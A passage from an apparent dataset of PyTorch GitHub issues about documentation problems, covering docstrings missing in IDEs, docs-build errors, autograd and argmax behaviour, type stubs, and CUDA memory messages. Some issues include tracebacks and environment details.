issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nThe documentation of torch functions (e.g. `torch.sort`, `torch.max`) and the class `torch.Tensor` is not loaded by common IDEs as PyCharm and Visual Studio Code.\r\nThe documentation of other modules (e.g. `torch.nn`, `torch.optim`) is loaded correctly.\r\n\r\nThe problem seems to be related to dynamic documentation which is not supported by IDEs (static docs are not inserted in `torch.__init__.pyi`). The (dynamic) documentation is loaded correctly in python consoles only.\r\nPlease see the related PyCharm issue.\r\n\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Create a new Python project with PyCharm or Visual Studio Code\r\n1. Import torch\r\n1. Start typing a torch function or a tensor method (e.g. `torch.sort`, `torch.ones', 'torch.ones().max`). An empty documentation popup will be opened.\r\nThe same behavior occurs with keyboard shortcuts (PyCharm: `Ctrl+Q`, Visual Studio Code: `Ctrl+K, Ctrl+I`)\r\n\r\n## Expected behavior\r\n\r\nStatic documentation should be available for every torch module to support documentation loading by IDEs.\r\n\r\n## Environment\r\n\r\n - PyTorch Version (e.g., 1.0): 1.2.0, 1.3.1, 1.4.0\r\n - OS (e.g., Linux): Windows and Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.6\r\n - CUDA/cuDNN version: 10\r\n - GPU models and configuration: 1080Ti\r\n - Any other relevant information: PyCharm 2019.3.2, Visual Studio Code 1.41.1\r\n\r\n## Additional context\r\n\r\nRelated PyCharm issue: [https://youtrack.jetbrains.com/issue/PY-40262](https://youtrack.jetbrains.com/issue/PY-40262)"},{"labels":[null,null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nBuilding the docs on master on my machine gives a long list of scary error messages. The docs build that we run in the CI doesn't seem to have this problem, implying that it might be a dependency issue. However, the `katex` package we use has no versioning(!) and doesn't appear to do normal releases. In the interest of making the docs build portable, we should fix the errors.\r\n\r\n```\r\n/usr/lib/nodejs/katex/dist/katex.js:1364\r\n                throw new _ParseError2.default(\"Expected '\" + text + \"', got '\" + this.nextToken.text + \"'\", this.nextToken);\r\n                ^\r\n\r\nParseError: KaTeX parse error: Expected 'EOF', got '\\\\' at position 33: …_{t} + g_{t+1} \\̲\\̲\r\np_{t+1} = p_{t…\r\n    at new ParseError (/usr/lib/nodejs/katex/dist/katex.js:1181:16)\r\n    at Parser.expect (/usr/lib/nodejs/katex/dist/katex.js:1364:23)\r\n    at Parser.parseInput (/usr/lib/nodejs/katex/dist/katex.js:1415:18)\r\n    at Parser.parse (/usr/lib/nodejs/katex/dist/katex.js:1401:30)\r\n    at parseTree (/usr/lib/nodejs/katex/dist/katex.js:9501:17)\r\n    at Object.renderToString (/usr/lib/nodejs/katex/dist/katex.js:68:40)\r\n    at Socket.<anonymous> (/usr/lib/nodejs/katex/cli.js:30:26)\r\n    at emitNone (events.js:111:20)\r\n    at Socket.emit (events.js:208:7)\r\n    at endReadableNT (_stream_readable.js:1064:12)\r\n/usr/lib/nodejs/katex/dist/katex.js:1364\r\n                throw new _ParseError2.default(\"Expected '\" + text + \"', got '\" + this.nextToken.text + \"'\", this.nextToken);\r\n                ^\r\n\r\nParseError: KaTeX parse error: Expected 'EOF', got '\\\\' at position 38: …+ lr * g_{t+1} \\̲\\̲\r\np_{t+1} = p_{t…\r\n    at new ParseError (/usr/lib/nodejs/katex/dist/katex.js:1181:16)\r\n    at Parser.expect (/usr/lib/nodejs/katex/dist/katex.js:1364:23)\r\n    at Parser.parseInput (/usr/lib/nodejs/katex/dist/katex.js:1415:18)\r\n    at Parser.parse (/usr/lib/nodejs/katex/dist/katex.js:1401:30)\r\n    at parseTree (/usr/lib/nodejs/katex/dist/katex.js:9501:17)\r\n    at Object.renderToString (/usr/lib/nodejs/katex/dist/katex.js:68:40)\r\n    at Socket.<anonymous> (/usr/lib/nodejs/katex/cli.js:30:26)\r\n    at emitNone (events.js:111:20)\r\n    at Socket.emit (events.js:208:7)\r\n    at endReadableNT (_stream_readable.js:1064:12)\r\n/usr/lib/nodejs/katex/dist/katex.js:1364\r\n                throw new _ParseError2.default(\"Expected '\" + text + \"', got '\" + this.nextToken.text + \"'\", this.nextToken);\r\n                ^\r\n\r\nParseError: KaTeX parse error: Expected 'EOF', got '\\\\' at position 147: … (2k+1)T_{max};\\̲\\̲\r\n\\eta_{t+1} = \\…\r\n    at new ParseError (/usr/lib/nodejs/katex/dist/katex.js:1181:16)\r\n    at Parser.expect (/usr/lib/nodejs/katex/dist/katex.js:1364:23)\r\n    at Parser.parseInput (/usr/lib/nodejs/katex/dist/katex.js:1415:18)\r\n    at Parser.parse (/usr/lib/nodejs/katex/dist/katex.js:1401:30)\r\n    at parseTree (/usr/lib/nodejs/katex/dist/katex.js:9501:17)\r\n    at Object.renderToString (/usr/lib/nodejs/katex/dist/katex.js:68:40)\r\n    at Socket.<anonymous> (/usr/lib/nodejs/katex/cli.js:30:26)\r\n    at emitNone (events.js:111:20)\r\n    at Socket.emit (events.js:208:7)\r\n    at endReadableNT (_stream_readable.js:1064:12)\r\n```\r\n\r\n\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nThe following code results in `0` when the expected answer is `-1`:\r\n\r\n```python\r\ndef f1(x):\r\n    def f2(y):\r\n        return y*(x-y)\r\n    return torch.autograd.grad(f2(x), x, create_graph=True)[0]\r\n\r\nx = torch.tensor(1.0, requires_grad=True)\r\ntorch.autograd.grad(f1(x), x)[0]\r\n```\r\n\r\n## To Reproduce\r\n\r\nRun the code above.\r\n\r\n## Expected behavior\r\n\r\nThe code should result in `tensor(-1.)` rather than `tensor(0.)`.\r\n\r\n## Environment\r\n\r\n```\r\nPyTorch version: 1.4.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: None\r\n\r\nOS: Mac OSX 10.15.1\r\nGCC version: Could not collect\r\nCMake version: version 3.15.5\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.16.3\r\n[pip3] torch==1.4.0\r\n[pip3] torchvision==0.5.0\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.3                      199  \r\n[conda] mkl_fft                   1.0.12           py37h5e564d8_0  \r\n[conda] mkl_random                1.0.2            py37h27c97d8_0  \r\n[conda] pytorch                   1.4.0                   py3.7_0    pytorch\r\n[conda] torchvision               0.5.0                  py37_cpu    pytorch\r\n```\r\n\r\n## Additional context\r\n\r\nThe following code in JAX produces the expected behaviour, for comparison:\r\n\r\n```python\r\ndef f1(x):\r\n    def f2(y):\r\n        return y*(x-y)\r\n    return jax.jvp(f2, (x,), (1.0,))[1]\r\n\r\njax.jvp(f1, (1.0,), (1.0,))[1] # => DeviceArray(-1., dtype=float32)\r\n```\r\n\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nTyping interface file([`nn/parameter.pyi`](https://github.com/pytorch/pytorch/blob/master/torch/nn/parameter.pyi) file) does not match with source code ([`nn/parameter.py`](https://github.com/pytorch/pytorch/blob/master/torch/nn/parameter.py) file).\r\n\r\n## Expected behavior\r\n\r\n`nn/parameter.pyi` should be\r\n\r\n```python\r\nfrom .. import Tensor\r\nimport builtins\r\n\r\nclass Parameter(Tensor):\r\n    def __init__(self, data: Tensor = ..., requires_grad: builtins.bool = ...): ...\r\n    ...\r\n```\r\n\r\nbecause arguments in `nn.Parameter`'s constructor has default values. (`def __new__(cls, data=None, requires_grad=True):`)\r\n\r\n## References\r\n\r\n* [PEP 484 Type Hints - Arbitrary argument lists and default argument values](https://www.python.org/dev/peps/pep-0484/#arbitrary-argument-lists-and-default-argument-values)"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nWhen trying to use the torch.conj example of the documentation, this raise a RuntimeError : could not infer dtype of complex.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Launch a python shell\r\n2. Run ```import torch; torch.conj(torch.tensor([-1 + 1j, -2 + 2j, 3 - 3j]))```\r\n\r\nExample trace : \r\n```Python 3.7.3 (default, Mar 27 2019, 22:11:17) \r\n[GCC 7.3.0] :: Anaconda, Inc. on linux\r\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\r\n>>> import torch\r\n>>> torch.conj\r\n<built-in method conj of type object at 0x7f0bd05621e0>\r\n>>> torch.conj(torch.tensor([-1 + 1j, -2 + 2j, 3 - 3j]))\r\nTraceback (most recent call last):\r\n  File \"<stdin>\", line 1, in <module>\r\nRuntimeError: Could not infer dtype of complex \r\n```\r\n\r\n## Expected behavior\r\n\r\nThe documentation line should work as is, or the error message should be a little more specific.\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.4.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: CentOS Linux release 7.7.1908 (Core)\r\nGCC version: (Homebrew gcc 5.5.0_4) 5.5.0\r\nCMake version: version 3.13.0\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.2.89\r\nGPU models and configuration: \r\nGPU 0: Tesla P100-SXM2-16GB\r\nGPU 1: Tesla P100-SXM2-16GB\r\nGPU 2: Tesla P100-SXM2-16GB\r\nGPU 3: Tesla P100-SXM2-16GB\r\n\r\nNvidia driver version: 440.33.01\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip] Could not collect\r\n[conda] blas                      1.0                         mkl  \r\n[conda] mkl                       2019.4                intel_243    intel\r\n[conda] mkl-service               2.3.0            py37he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py37ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py37hd6b4f25_0  \r\n[conda] pytorch                   1.4.0           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n[conda] torchvision               0.5.0                py37_cu101    pytorch\r\n[conda] torchviz                  0.0.1                    pypi_0    pypi\n\ncc @ezyang"},{"labels":["documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\nIn the case of multiple occurrences of the maximum values, [numpy.argmax](https://docs.scipy.org/doc/numpy/reference/generated/numpy.argmax.html) returns the indices corresponding to the first occurrence. Though not specified in the documentation, [torch.argmax](https://pytorch.org/docs/stable/torch.html#torch.argmax) returns the last occurrence instead.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```\r\n>>> import torch\r\n>>> a = torch.tensor([0, 1, 1, 1])\r\n>>> print(a.argmax())\r\ntensor(3)\r\n```\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\nAlign the behaviors of `PyTorch` with `NumPy`, or explicitly state the differences in the documentation to avoid confusion. \r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0): 1.4.0\r\n - OS (e.g., Linux): Linux\r\n - How you installed PyTorch (`conda`, `pip`, source): pip\r\n - Build command you used (if compiling from source):\r\n - Python version: 3.7\r\n - CUDA/cuDNN version: 10.1\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\n\ncc @ngimel"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\nNot so much a \"bug\" per se.  We are stopping the regular execution of daily builds using Python 2.7 on the Power (ppc64le) platform, for both CPU and GPU builds.  \r\nAs such, we wish to remove the build status for these two scenarios from the build table shown\r\nin the main README.md file.  That is the only change here.\r\n\r\nWorth noting:  We'll still have the capability to run a py27 build on request, if or as needed.  We\r\nsimply aren't going to maintain this as a regular build and wish to no longer have the status\r\npublicized.  The Python 3.6 builds will remain and will be the primary focus.\r\n\r\n## To Reproduce\r\n          N/A\r\n## Expected behavior\r\n          N/A\r\n## Environment\r\n          Power platform, Python 2.7 builds.\r\n\r\nI will take care of submitting a pull request for this."},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nHi so i was looking at the pytorch Documentation for torchvision.transforms at https://pytorch.org/docs/stable/torchvision/transforms.html\r\nI found this typo .\r\n![image](https://user-images.githubusercontent.com/44923912/72512376-e1c57580-3843-11ea-897c-bd64eb7b5998.png)\r\n\r\nLooking at the highlighted part of the test it states\r\ninput[channel] = (input[channel] - mean[channel]) / std[channel]\r\nbut it should be \r\nOutput[channel] = (input[channel] - mean[channel]) / std[channel]\r\n\r\nas i understand .\r\n\n\ncc @fmassa"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nI found that neither https://pytorch.org/docs/master/nn.functional.html#torch.nn.functional.kl_div\r\n\r\nnor https://pytorch.org/docs/master/nn.html#torch.nn.KLDivLoss provide a formula of kl divergence to indicate what is the relationship of input, target and P, Q in wikipedia reference.\r\n\r\nThe kl_div(input, target) is actually D(target, input) as mentioned in https://discuss.pytorch.org/t/custom-loss-kl-divergence-error/19850/4?u=thyrixyang\r\n\r\nAlthough in wikipedia it said D(p, q) is distance **of Q from P**, which suggests P should be the target, I think there should be a formula to make it clear. Otherwise, someone not very familiar with kl divergence like me may easily think kl_div(input, target)=D(input, target).\r\n"},{"labels":["documentation",null],"text":"See https://github.com/pytorch/pytorch/pull/27361\r\n\r\nThis uses DeprecationWarnings, but we usually use UserWarnings because many python versions filter DeprecationWarnings by default, making them pretty much useless."},{"labels":[null,"documentation",null],"text":"This is based on https://github.com/pytorch/pytorch/issues/31497 (after the last messages with @albanD and @ezyang)\r\n\r\nCondensed, I had a script there that printed:\r\n```python\r\nprint('memory_allocated', torch.cuda.memory_allocated() / 1e9, 'memory_cached', torch.cuda.memory_cached() / 1e9)\r\n```\r\nin a model eval loop. And at some point it got an OOM:\r\n```\r\nmemory_allocated 9.7478528 memory_cached 22.013804544\r\nmemory_allocated 11.03991552 memory_cached 24.29550592\r\n\r\nRuntimeError: CUDA out of memory. Tried to allocate 152.00 MiB (GPU 0; 31.72 GiB total capacity; 24.89 GiB already allocated; 6.12 MiB free; 30.70 GiB reserved in total by PyTorch)\r\n```\r\n\r\nSome things:\r\n1. `torch.cuda.memory_allocated()` of 11Gb is not reported in OOM message\r\n\r\n2. Terminology discrepancy: `torch.cuda.memory_cached` seems to be equivalent to \"already allocated\" from OOM message. In presence of also existing `torch.cuda.memory_allocated` this is confusing. Probably the OOM message should also say `cached`. Otherwise, it's pretty easy to mix up allocated, cached, reserved.\r\n\r\n3. It would be nice for the OOM message to include by default a small glossary/explainer explaining all these various memory counters.\r\n\r\nRelated: my previous issue about feature request of adding by default some measure of fragmentation: https://github.com/pytorch/pytorch/issues/29554, my old issue about allocator stats https://github.com/pytorch/pytorch/issues/1529.\r\n\r\nRecently there were a few reports of default allocator causing problems with very varying batch sizes (myself included). To confirm the guess, it would be nice to have an easily interpretable allocator state visualization / dump (super cool would be to have a way to dump an HTML vis). Currently there exists `torch.cuda.memory_stats`, `torch.cuda.memory_usage` and `torch.cuda.memory_snapshot`. It would be nice to have some default advice on what to save / use when debugging for suspected fragmentation.\r\n\r\nIn addition, they are not searchable for whatever reason: https://pytorch.org/docs/master/search.html?q=memory_usage&check_keywords=yes&area=default#\n\ncc @ngimel"},{"labels":["documentation",null],"text":"The Jenkins [readme.md](https://github.com/pytorch/pytorch/blob/master/.jenkins/pytorch/README.md) contains the broken link `https://github.com/pietern/pytorch-dockerfiles/blob/master/build.sh`. This repository has been moved on 11/11/2019, and it looks like the link should be replaced with `https://github.com/pytorch/pytorch-ci-dockerfiles/blob/master/build.sh`.\r\n\r\nEdit: It looks like I was looking in the wrong place. The CI dockerfiles are also included in a [subdirectory](https://github.com/pytorch/pytorch/tree/master/.circleci). I'm not sure where the link is intended to be pointing, however."},{"labels":[null,null,null,"documentation",null],"text":"https://pytorch.org/docs/master/search.html?q=torch.no_grad&check_keywords=yes&area=default\r\n\r\nhttps://pytorch.org/docs/master/autograd.html?highlight=torch%20no_grad#torch.autograd.no_grad\r\n\r\nThe docs describe the usage of `torch.no_grad()` to create the context manager but they are filed under class `torch.autograd.no_grad`\r\n\r\nIt would be nice to have docs for `torch.no_grad` as well. User may well want to search for it when reading some source code. It'd also be nice to draw users' extra attention to the fact that parenthesis must be used after the `@torch.no_grad()` versus e.g. `@staticmethod` (which goes without parens)\n\ncc @ezyang @SsnL @albanD @zou3519 @gqchen"},{"labels":[null,null,"documentation",null,null],"text":"I was attempting to run https://pytorch.org/tutorials/advanced/cpp_frontend.html on master but it didn't work, because the cmake is out of date: it needed to be `CXX_STANDARD 14` now that we are C++14.\r\n\r\nThis should have been caught in CI for the change that made us C++14. The problem is that we are not running the tutorial examples in CI. We should do so.\n\ncc @ezyang @gchanan @zou3519"},{"labels":[null,"documentation",null,null],"text":"Hello,\r\n\r\nI am trying to train with 4 V100 GPU. What I have observe is that when the multiplication of batch size with number of workers exceeds some limit, I get the following error below. I cannot understand what is the limiting fact. One reason can be the RAM size because the system gives me a warning that swap + memory has exceeds the limits at least one even if the code does not stop because of the error specified below. Or is it the memory limit in GPU? Thanx in advance for your help. \r\n\r\nI am using,\r\nTorch 1.1.0,\r\nCuda9.0\r\n\r\nIf you need further package details, I can provide. \r\nThanx in advance\r\n\r\nTraceback (most recent call last):\r\n  File \"two_stream_bert.py\", line 713, in <module>\r\n    main()\r\n  File \"two_stream_bert.py\", line 297, in main\r\n    train(train_loader, model, criterion,criterion2, optimizer, epoch,setMseCoeff,modality)\r\n  File \"two_stream_bert.py\", line 451, in train\r\n    output, input_vectors, sequenceOut, maskSample = model(inputs)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/modules/module.py\", line 493, in __call__\r\n    result = self.forward(*input, **kwargs)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/data_parallel.py\", line 148, in forward\r\n    inputs, kwargs = self.scatter(inputs, kwargs, self.device_ids)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/data_parallel.py\", line 159, in scatter\r\n    return scatter_kwargs(inputs, kwargs, device_ids, dim=self.dim)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 35, in scatter_kwargs\r\n    inputs = scatter(inputs, target_gpus, dim) if inputs else []\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 28, in scatter\r\n    return scatter_map(inputs)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 15, in scatter_map\r\n    return list(zip(*map(scatter_map, obj)))\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/scatter_gather.py\", line 13, in scatter_map\r\n    return Scatter.apply(target_gpus, None, dim, obj)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/nn/parallel/_functions.py\", line 89, in forward\r\n    outputs = comm.scatter(input, target_gpus, chunk_sizes, ctx.dim, streams)\r\n  File \"/truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/cuda/comm.py\", line 147, in scatter\r\n    return tuple(torch._C._scatter(tensor, devices, chunk_sizes, dim, streams))\r\nRuntimeError: CUDA error: out of memory (malloc at /pytorch/c10/cuda/CUDACachingAllocator.cpp:241)\r\nframe #0: std::function<std::string ()>::operator()() const + 0x11 (0x2ad6b175f441 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10.so)\r\nframe #1: c10::Error::Error(c10::SourceLocation, std::string const&) + 0x2a (0x2ad6b175ed7a in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10.so)\r\nframe #2: <unknown function> + 0x1581d (0x2ad6b381481d in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10_cuda.so)\r\nframe #3: <unknown function> + 0x16247 (0x2ad6b3815247 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libc10_cuda.so)\r\nframe #4: at::native::empty_cuda(c10::ArrayRef<long>, c10::TensorOptions const&) + 0x121 (0x2ad674e42f81 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2_gpu.so)\r\nframe #5: at::CUDAType::empty(c10::ArrayRef<long>, c10::TensorOptions const&) const + 0x19b (0x2ad673a8a6fb in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2_gpu.so)\r\nframe #6: torch::autograd::VariableType::empty(c10::ArrayRef<long>, c10::TensorOptions const&) const + 0x284 (0x2ad6b2522094 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch.so.1)\r\nframe #7: at::native::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) + 0x506 (0x2ad6a7b67666 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2.so)\r\nframe #8: at::TypeDefault::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x17 (0x2ad6a7de6857 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libcaffe2.so)\r\nframe #9: torch::autograd::VariableType::to(at::Tensor const&, c10::TensorOptions const&, bool, bool) const + 0x2c2 (0x2ad6b240bb52 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch.so.1)\r\nframe #10: torch::cuda::scatter(at::Tensor const&, c10::ArrayRef<long>, c10::optional<std::vector<long, std::allocator<long> > > const&, long, c10::optional<std::vector<c10::optional<c10::cuda::CUDAStream>, std::allocator<c10::optional<c10::cuda::CUDAStream> > > > const&) + 0x389 (0x2ad6b295ffd9 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch.so.1)\r\nframe #11: <unknown function> + 0x5a27bf (0x2ad6720a27bf in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch_python.so)\r\nframe #12: <unknown function> + 0x130cfc (0x2ad671c30cfc in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch_python.so)\r\nframe #13: _PyCFunction_FastCallDict + 0x154 (0x2ad6591c0b94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #14: <unknown function> + 0x19e67c (0x2ad65925067c in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #15: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #16: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #17: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #18: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #19: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #20: PyEval_EvalCodeEx + 0x329 (0x2ad65924b459 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #21: <unknown function> + 0x19a264 (0x2ad65924c264 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #22: PyObject_Call + 0x3e (0x2ad6591c099e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #23: THPFunction_apply(_object*, _object*) + 0x6b1 (0x2ad671eb3481 in /truba/home/mkalfaoglu/anaconda3/envs/master/lib/python3.6/site-packages/torch/lib/libtorch_python.so)\r\nframe #24: _PyCFunction_FastCallDict + 0x91 (0x2ad6591c0ad1 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #25: <unknown function> + 0x19e67c (0x2ad65925067c in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #26: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #27: <unknown function> + 0x197dae (0x2ad659249dae in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #28: _PyFunction_FastCallDict + 0x1bb (0x2ad65924ae1b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #29: _PyObject_FastCallDict + 0x26f (0x2ad6591c0f5f in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #30: <unknown function> + 0x12a552 (0x2ad6591dc552 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #31: PyIter_Next + 0xe (0x2ad659205c9e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #32: PySequence_Tuple + 0xf9 (0x2ad65920aad9 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #33: _PyEval_EvalFrameDefault + 0x563a (0x2ad659277ffa in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #34: <unknown function> + 0x197dae (0x2ad659249dae in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #35: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #36: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #37: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #38: <unknown function> + 0x197dae (0x2ad659249dae in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #39: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #40: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #41: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #42: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #43: <unknown function> + 0x198941 (0x2ad65924a941 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #44: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #45: _PyEval_EvalFrameDefault + 0x10ba (0x2ad659273a7a in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #46: <unknown function> + 0x19870b (0x2ad65924a70b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #47: <unknown function> + 0x19e755 (0x2ad659250755 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #48: _PyEval_EvalFrameDefault + 0x2fa (0x2ad659272cba in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #49: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #50: _PyFunction_FastCallDict + 0x3db (0x2ad65924b03b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #51: _PyObject_FastCallDict + 0x26f (0x2ad6591c0f5f in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #52: _PyObject_Call_Prepend + 0x63 (0x2ad6591c5a03 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #53: PyObject_Call + 0x3e (0x2ad6591c099e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #54: _PyEval_EvalFrameDefault + 0x1ab0 (0x2ad659274470 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #55: <unknown function> + 0x197a94 (0x2ad659249a94 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #56: _PyFunction_FastCallDict + 0x1bb (0x2ad65924ae1b in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #57: _PyObject_FastCallDict + 0x26f (0x2ad6591c0f5f in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #58: _PyObject_Call_Prepend + 0x63 (0x2ad6591c5a03 in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #59: PyObject_Call + 0x3e (0x2ad6591c099e in /truba/home/mkalfaoglu/anaconda3/envs/master/bin/python)\r\nframe #60: 